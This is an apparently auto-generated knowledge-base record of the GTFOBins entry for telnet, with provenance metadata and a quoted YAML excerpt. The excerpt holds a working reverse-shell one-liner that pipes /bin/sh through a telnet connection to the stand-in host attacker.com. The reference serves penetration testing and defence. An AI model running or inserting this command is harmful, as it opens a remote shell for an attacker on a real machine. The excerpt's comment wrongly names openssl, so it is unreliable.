---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# telnet

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `telnet` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/telnet` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for telnet covering reverse-shell, shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/telnet.md)
- Source verification: [source record](../../sources/gtfobins/telnet.md)

## Aliases

- `telnet`

## Source Verification

[source record](../../sources/gtfobins/telnet.md)

## Evidence Excerpt

```text
_body: ''
_name: telnet
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/telnet
functions:
reverse-shell:
- code: 'mkfifo /path/to/temp-socket
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket'
comment: The shell process is not spawn by `openssl`.
```
